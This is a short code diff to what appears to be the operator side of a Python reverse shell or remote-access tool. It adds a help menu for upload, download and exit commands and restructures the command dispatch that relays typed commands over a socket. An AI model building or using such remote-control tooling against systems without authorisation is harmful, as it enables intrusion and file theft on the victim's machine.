@@ -63,18 +63,33 @@ if __name__ == '__main__':
             except:
                 pass
             
-            if command[:6] == "upload":
+            if command == "help":
+
+                print("""
+                 
+                +----------------+----------------------+
+                | upload file    |   [upload file_name] |
+                +----------------+----------------------+
+                | download file  | [download file_name] |
+                +----------------+----------------------+
+                | exit           |               [exit] |
+                +----------------+----------------------+
+                 
+                """)
+
+            elif command[:6] == "upload":
                 
                 upload_file(command[7:])
             
-            if command[:8] == "download":
+            elif command[:8] == "download":
+
                 download_file(command)
 
-            if command == "exit":
+            elif command == "exit":
                 print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
                 break
                 
-            if command[:2] != "cd" and command[:6] != "upload" and command[:8] != "download":
+            elif command[:2] != "cd":
                 data = conn.recv(1024)
                 print(data.decode())
 
